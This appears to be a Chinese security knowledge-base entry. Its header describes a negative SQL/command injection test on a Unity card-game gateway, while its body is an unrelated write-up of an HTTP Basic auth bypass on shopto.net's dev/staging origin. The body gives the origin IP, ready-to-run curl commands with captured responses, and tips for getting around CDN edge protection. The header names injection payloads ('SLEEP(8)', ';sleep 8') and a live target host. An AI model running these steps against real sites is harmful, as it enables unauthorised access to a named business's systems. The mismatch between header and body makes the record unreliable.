# Unity 牌局网关裸 TCP protobuf 预登录帧字符串字段 SQL/命令注入阴性（account 不进入 SQL，邮箱格式前置校验吞掉载荷）

- **code**: unity-牌局网关裸-tcp-protobuf-预登录帧字符串字段-sql-命令注入阴性-account-不进入-sq
- **kind**: payload
- **category**: sqli
- **component**: 自研 Unity 牌局网关（裸 TCP + protobuf）
- **language**: markdown
- **source**: self
- **verified**: 1
- **verified_note**: sjan.o0hyfmi.club:36610 实测：ReqLogin account 的 "' AND SLEEP(8)-- " 与 ";sleep 8" 回 27B sha16=1c66fa4a5f1fb018 逐字节同基线（0.075/0.058s）；ReqVerifyCode account 的引号载荷与无元字符非法邮箱 artex9070plain 均 0.074s 回 result=1，证明是邮箱格式前置校验。
- **tags**: 36610,protobuf,裸TCP,Sqli阴性,命令注入阴性,ReqLogin,ReqVerifyCode,判据
- **created_at**: 2026-11-04T16:49:28.524Z
- **engine**: sjan.o0hyfmi.club:36610

## 描述

对该类网关做注入判断的判据与陷阱：①时间盲测试不能用会触发真实发信的帧（ReqVerifyCode 基线 6.5s 且抖动大），要用不产生副作用的帧（ReqLogin/HEARTBEAT）做时间基；②若某帧对任何格式错误都回同一个 result=1，必须补一发"无 SQL 元字符但格式非法"的判别帧，才能区分前置校验与 SQL 报错映射。

## 用法

```
复现判据：帧=16B 头(rsv u32/type u32/len i32/seq i32)+protobuf；0x1000 HEARTBEAT 应回 23B 同体作对照。ReqVerifyCode 0x2000{1:type=0,2:account,3:channel,4:useType,6:attach}；ReqLogin 0x2001{1:cert,2:channel,3:deviceType,4:certType,8:account,9:properties}。发 account="...' AND SLEEP(8)-- " 与无元字符非法邮箱各一发，逐字节比对基线与耗时。
```

## 正文

```
# shopto.net dev/staging 源站 HTTP Basic 门禁可被 Host 头绕过 → 非预期访问完整 storefront

归类：auth-validate control（认证校验/访问控制失效）→ auth-bypass
严重度：medium
来源：task#4 shopto.net 全流程安全验证，finding_id=61（verdict=verified）

## 目标 / 入口
- 源站 IP：`3.8.196.174`（`dev.shopto.net` / `staging.shopto.net` 的 A 记录，直达公网，**无 CloudFront 边缘**，可作绕过边缘 WAF 的通道）
- 入口：`https://3.8.196.174/`，用 `-H 'Host: ...'` 切换 vhost
- 端口：443（HTTPS）

## 前置条件
- 能直连 `3.8.196.174:443`（公网可达）
- curl 加 `-k` 忽略证书
- **必须用 HTTP/1.0**（`--http1.0`）：HTTP/1.1 打 `/` 会得到 empty reply

## 复现步骤（实测）

### 1) 基线：合法 dev vhost 受 HTTP Basic 保护
```bash
curl -sk --http1.0 --resolve dev.shopto.net:443:3.8.196.174 \
     -H 'Host: dev.shopto.net' https://3.8.196.174/ -D -
```
回显：
```
HTTP/1.0 401 Unauthorized
Www-Authenticate: Basic realm="Restricted area"
Content-Length: 0
```

### 2) 关键一步：Host 换成任意非 *.shopto.net 值 → 绕过门禁，拿到完整商城主页
```bash
curl -sk --http1.0 -H 'Host: localhost' https://3.8.196.174/ \
     -o rt_localhost.html -w '\n%{http_code} %{size_download}\n'
```
回显（完整回显，非错误页）：
```
HTTP/1.0 200 OK
... Set-Cookie: sidb2c=<REDACTED>; path=/; SameSite=Lax; secure; HttpOnly
<title>Buy and Pre-order Video Consoles & More | ShopTo.net</title>
200 280690
```

### 3) 证明不是 localhost 特例（默认/catch-all vhost 未加认证）
```bash
for H in 127.0.0.1 foo.bar.baz 3.8.196.174; do
  curl -sk --http1.0 -H "Host: $H" https://3.8.196.174/ \
       -o "rt_$H.html" -w "Host=$H %{http_code} %{size_download}\n"
done
```
回显：三种 Host 全部 `200`、`size=280690`，标题同为 ShopTo 商城 → 说明是默认 vhost 未做认证，而非某个域名被白名单。

### 4) 受保护的 dev vhost 上，部分接口也未纳入认证
```bash
curl -sk --http1.0 -H 'Host: dev.shopto.net' \
     https://3.8.196.174/module/dcshop/b2c/ajax_cart.php
```
回显：`HTTP/1.0 200  {"status":"ok","content":"..."}`（3482 字节）—— 即使在需要 Basic 的 dev vhost 上，`/module/` 路径也未被认证覆盖。

## 判据（同时成立才算成立）
1. Host = `dev.shopto.net` → 401（`Www-Authenticate: Basic realm="Restricted area"`）；Host = 任意非 `*.shopto.net` → 200（强烈对照）。
2. 200 的正文体积与正常主站一致（完整 storefront ≈280690 字节），不是错误页/跳转页。
3. 多个不同的非 `*.shopto.net` Host 结果逐字节一致 ⇒ 命中 catch-all/默认 vhost，未同步加认证。

## 根因
同一 nginx 上多 vhost 共置：`dev/staging` 等 vhost 在 web 层加了 HTTP Basic，但**默认/catch-all vhost 未加认证且指向同一 docroot**；非 `*.shopto.net` 的 Host 落到默认 vhost，直接返回完整商城（canonical 指向 `www.shopto.net`），Basic 门禁被完全绕过。
（同源站的另一面 —— 默认 vhost `/error` 跨租户泄露 + 内网 IP `192.168.56.180` + DcCMS 2015 指纹 —— 见库内条目 id 527，二者互补。）

## 失败时的常见原因
- 用了 HTTP/1.1 → empty reply（必须 `--http1.0`）。
- Host 用了带 `*.shopto.net` 后缀的值 → 仍命中受保护 vhost，返回 401。
- 源站前有 CDN/边缘网关 → 先按 TLS 证书 SAN / 子域枚举找到不走 CDN 的源站 IP 再直连。
- 所有 Host 响应一致地 404/444 → 默认 vhost 已加 Host 白名单或被禁用。

## 风险与影响
未授权访问验证环境（dev/staging）的完整 storefront；该源站无 CloudFront，可绕过边缘 WAF 直接测接口，可能暴露仅限内网/预发可见的功能与数据。

```
